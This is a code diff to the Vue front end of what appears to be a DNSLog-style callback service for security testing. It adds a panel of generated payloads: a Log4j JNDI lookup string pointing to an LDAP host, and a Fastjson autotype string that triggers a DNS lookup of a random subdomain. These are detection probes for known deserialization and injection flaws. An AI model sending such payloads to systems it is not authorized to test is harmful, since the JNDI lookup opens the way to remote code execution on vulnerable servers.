@@ -19,6 +19,9 @@
     <button type="button" v-on:click="Clean">清空</button>
     <br><br>
     <div id="myDomain">{{ randDomain }}</div>
+    <template v-if="randDomain !== ''" v-for="(item,key) in payload">
+        <div>{{key}}: <code>{{item.replace("domain",randDomain)}}</code></div>
+    </template>
     <br>
     <center>
         <table id="myRecords" width=700 border="0" cellpadding="5" cellspacing="1" bgcolor="#EFF3FF"
@@ -74,6 +77,15 @@
         ;
         return fmt;
     }
+
+    function randomStr() {
+        const chars = 'abcdefhijkmnprstwxyz1234567890';
+        let randStr = "";
+        for (i = 0; i < 5; i++) {
+            randStr += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return randStr
+    }
 </script>
 <script>
     var app = new Vue({
@@ -83,6 +95,10 @@
             Token: "",
             domain: "",
             randDomain: "",
+            payload: {
+                "Log4j": "${jndi:ldap://domain:9999/aaa}",
+                "Fastjson": '{"@type":"java.net.Inet4Address","val":"domain"}'
+            },
         },
         methods: {
             GetDomain: function () {
@@ -92,17 +108,19 @@
                     }
                 }).then(
                     res => {
+                        if (res.data.msg == "error") {
+                            alert("token错误");
+                            localStorage.clear();
+                            location.reload()
+                            return
+                        }
                         if (res['data']['HTTPStatusCode'] == 200) {
                             if (res['data']['Msg'] != 'null') {
                                 let DnsData = JSON.parse(res['data']['Msg']).reverse();
-                                let DnsDatas = new Array();
-                                for (var i = 0; i < DnsData.length; i++) {
-                                    if (DnsData[i].Subdomain.indexOf(this.Token) !== -1) {
-                                        DnsData[i].Time = formatTimeToStr(DnsData[i].Time)
-                                        DnsDatas.push(DnsData[i])
-                                    }
+                                for (let i = 0; i < DnsData.length; i++) {
+                                    DnsData[i].Time = formatTimeToStr(DnsData[i].Time)
                                 }
-                                this.DnsData = DnsDatas
+                                this.DnsData = DnsData
                             } else {
                                 this.DnsData = ""
                             }
@@ -124,13 +142,9 @@
                 this.DnsData = ""
             },
             GenPayload: function () {
-                const chars = 'abcdefhijkmnprstwxyz1234567890';
-                let randStr = "";
-                for (i = 0; i < 5; i++) {
-                    randStr += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                let randDomain = randStr + "." + this.domain;
-                var domUrl = document.createElement("input");
+                let randDomain = randomStr() + "." + this.domain;
+
+                let domUrl = document.createElement("input");
                 domUrl.value = randDomain;
                 domUrl.id = "creatDom";
                 document.body.appendChild(domUrl);
@@ -138,6 +152,7 @@
                 document.execCommand("Copy"); // 执行浏览器复制命令
                 let creatDom = document.getElementById("creatDom");
                 creatDom.parentNode.removeChild(creatDom);
+
                 app.randDomain = randDomain
                 alert("复制成功");
             }
@@ -152,7 +167,7 @@
                         if (res.data.HTTPStatusCode == "200") {
                             this.Token = token
                             localStorage.setItem("token", token);
-                            this.domain = res.data.Msg
+                            this.domain = res.data.Msg;
                             localStorage.setItem("domain", res.data.Msg);
                         } else {
                             alert("token错误")
